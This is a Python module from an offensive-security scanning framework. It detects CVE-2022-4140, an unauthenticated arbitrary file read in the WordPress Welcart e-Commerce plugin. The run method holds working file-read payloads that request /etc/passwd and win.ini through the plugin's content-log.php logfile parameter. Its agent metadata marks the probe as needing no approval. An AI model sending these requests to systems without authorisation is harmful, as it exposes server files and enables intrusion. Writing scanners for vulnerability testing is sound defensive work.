#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Welcart e-Commerce plugin before 2."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Welcart e-Commerce <2.8.5 - Arbitrary File Access Detection',
        'description': 'WordPress Welcart e-Commerce plugin before 2.8.5 is susceptible to arbitrary file access. The plugin does not validate user input before using it to output the content of a file, which can allow an attacker to read arbitrary files on the server, obtain sensitive information, modify data, and/or execute unauthorized operations.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'usc-e-shop', 'wpscan', 'wp-plugin', 'wp', 'wordpress', 'lfi', 'unauthenticated', 'collne', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/0d649a7e-3334-48f7-abca-fff0856e12c7',
            'https://wordpress.org/plugins/usc-e-shop/',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-4140',
        ],
        'cve': 'CVE-2022-4140',
    }

    def run(self):
        for path in ('/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=/etc/passwd', '/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=/Windows/win.ini'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            header_any = ('text/html',)
            body_regexes = ('root:.*:0:0:', '\\[(font|extension|file)s\\]',)
            if (any(m in headers for m in header_any)) and (any(re.search(rx, body, 0) for rx in body_regexes)):
                self.set_info(
                    severity='high',
                    reason="WordPress Welcart e-Commerce <2.8.5 - Arbitrary File Access detected",
                    path=path,
                )
                return True
        return False

